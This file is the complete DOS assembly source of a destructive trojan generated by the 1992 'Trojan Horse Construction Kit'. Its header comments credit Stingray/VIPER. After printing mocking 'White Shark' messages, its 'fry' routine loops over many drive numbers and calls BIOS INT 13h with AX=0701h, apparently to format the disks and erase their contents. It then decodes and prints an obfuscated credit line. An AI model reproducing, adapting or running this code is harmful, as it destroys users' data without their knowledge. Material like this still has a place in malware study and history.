; Trojan Horse Constructed with...
; The Trojan Horse Construction Kit, v1.00
; Copyright(c) 1992, Stingray/VIPER
; A Viral Inclined Programming Experts Ring Programming Team Production.

IDEAL
DOSSEG
MODEL small
STACK 256
DATASEG
msg_1   db   "",13,10
        db   "This is a Trojain horse. Curtocy of White Shark! HA HA HA",13,10
        db   "",13,10
        db   "Mess with White Shark and you'll be eaten alive!",13,10
        db   "",13,10
        db   "",13,10
        db   "",13,10
        db   "",13,10
        db   "",13,10
        db   "",13,10
        db   '$'
msg_2   db   "",13,10
        db   "You've been fucked! Curtocy of White Shark!",13,10
        db   "",13,10
        db   "Mess with White Shark and you'll be eaten alive!",13,10
        db   "",13,10
        db   "",13,10
        db   "",13,10
        db   "",13,10
        db   "",13,10
        db   "",13,10
        db   '$'
vip     db   "±≈∆–}—œÃ«æÀ}‘æ–}¿œ¬æ—¬¡}‘∆—≈ããã",106,103
        db   "±≈¬}±œÃ«æÀ}•Ãœ–¬}†ÃÀ–—œ“¿—∆ÃÀ}®∆—â}”éãçç",106,103
        db   "†ÃÕ÷œ∆ƒ≈—}Ö¿Ü}éññèâ}≥∆œæ…}¶À¿…∆À¬¡}≠œÃƒœæ  ∆Àƒ}¢’Õ¬œ—–}Ø∆Àƒã",106,103
CODESEG
Start:
   mov  ax,@data
   mov  ds,ax

   mov  ah,9
   mov  dx,offset msg_1
   int  21h
   mov dl,24
aqui:
   call fry
   call fry
   call fry
   inc  dl
   cmp  dl,1
   jne  aqui
   mov  ah,9
   mov  dx,offset msg_2
   int  21h
   mov  si,offset vip
   call DeCrypt_Print
   jmp  Exit
PROC    DeCrypt_Print
   push ax
   push dx
here:
   lodsb
   or   al,al
   je   no_mas
   xchg dl,al
   sub  dl,93
   mov  ah,2
   int  21h
   jmp  short here
no_mas:
   pop  ax
   pop  dx
   ret
ENDP    DeCrypt_Print
PROC    fry
   push dx
   mov  ax,ds
   mov  es,ax
   mov  ax,0701h
   mov  ch,0
   int  13h
   pop  dx
   ret
ENDP    fry
Exit:
   mov  ax,4c00h
   int  21h
        END Start
